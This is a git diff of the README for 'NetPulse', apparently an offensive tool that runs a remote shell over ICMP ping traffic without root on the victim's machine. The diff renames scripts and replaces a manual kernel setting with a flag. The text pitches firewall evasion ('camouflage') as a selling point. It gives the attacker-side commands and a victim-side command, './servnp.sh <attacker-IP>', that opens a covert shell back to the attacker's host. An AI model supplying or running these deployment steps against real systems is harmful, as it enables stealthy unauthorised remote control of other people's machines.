@@ -2,8 +2,6 @@
 
 NetPulse is an ICMP SHELL tool that does not require root access on the victim's side. This guide provides detailed information on how to use NetPulse.
 
-<img src="https://github.com/thekh40s/netpulse/assets/129444003/110df8c1-6116-488a-9012-830512eff5c3" width="800">
-
 ## Advantages of NetPulse
 - **No Root Access Required:** NetPulse eliminates the need for root access on the victim's side.
 - **Camouflage:** ICMP traffic is common and often allowed in networks and firewalls.
@@ -20,37 +18,24 @@ Attacker-side configuration is more complex and requires root access. Follow the
 
 ### Disable Kernel Auto-Response to Pings:
 
-Check the value of the `/proc/sys/net/ipv4/icmp_echo_ignore_all` file:
-```bash
-$ cat /proc/sys/net/ipv4/icmp_echo_ignore_all
+To disable the kernel's automatic ping response, use the `-s` flag:
 ```
-Change the value to "1" to disable automatic responses:
-```bash
-$ echo 1 | sudo tee /proc/sys/net/ipv4/icmp_echo_ignore_all
+$ sudo python3 netpulse.py -s
 ```
-Make the changes permanent in `/etc/sysctl.conf`:
-```bash
-$ sudo nano /etc/sysctl.conf
-```
-Add the following line:
-```
-net.ipv4.icmp_echo_ignore_all = 1
-```
-Apply the settings:
-```bash
-$ sudo sysctl -p
-```
+
+If you want to enable it again, you can use the same option.
+This change is not permanent and will revert to the default upon system restart.
 
 ### Starting the Client
 
-To start the client, execute the [netpulse_client.py](/netpulse_client.py) file with root permissions:
+To start the client, execute the [netpulse.py](/netpulse.py) file with root permissions:
 
 ```bash
-$ sudo python3 netpulse_client.py -i <interface> <victim-IP>
+$ sudo python3 netpulse.py -i <interface> <victim-IP>
 ```
 For more options, use the -h flag:
 ```bash
-$ python3 netpulse_client.py -h
+$ python3 netpulse.py -h
 ```
 
 ## Victim-Side Configuration
@@ -59,9 +44,9 @@ Victim-side configuration is simpler and does not require root access. Ensure th
 - [iputils-ping](https://packages.debian.org/bullseye/iputils-ping) - Tool for testing the reachability of network hosts.
 - [xxd](https://packages.debian.org/bullseye/xxd) - Tool for creating (or reversing) a hexadecimal dump.
 
-If all the necessary tools are installed, run the [netpulse_server.sh](/netpulse_server.sh) file:
+If all the necessary tools are installed, run the [servnp.sh](/servnp.sh) file:
 ```bash
-$ chmod +x netpulse_server.sh && ./netpulse_server.sh <attacker-IP>
+$ chmod +x servnp.sh && ./servnp.sh <attacker-IP>
 ```
 
 # Buy me a Coffee :p
